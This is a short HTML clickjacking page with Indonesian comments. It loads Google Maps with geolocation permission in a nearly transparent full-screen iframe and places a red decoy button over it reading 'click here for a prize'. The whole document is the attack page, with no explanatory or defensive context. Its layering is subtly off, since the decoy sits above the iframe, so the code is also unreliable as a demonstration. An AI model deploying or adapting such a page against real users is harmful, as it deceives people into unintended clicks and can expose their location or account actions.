<!DOCTYPE html>
<html>
<head>
    <style>
        body { margin: 0; padding: 0; overflow: hidden; }
        /* Iframe yang memuat situs target */
        #target-frame {
            width: 100vw; height: 100vh;
            border: none;
            opacity: 0.1; /* Transparan agar bisa ditumpuk */
            position: absolute;
            z-index: 1;
        }
        /* Tombol jebakan */
        #fake-button {
            position: absolute;
            top: 200px; left: 200px;
            z-index: 2;
            padding: 20px;
            background: red;
            color: white;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <div id="fake-button">KLIK DISINI UNTUK HADIAH!</div>
    <iframe id="target-frame" src="https://maps.google.com" allow="geolocation"></iframe>
</body>
</html>
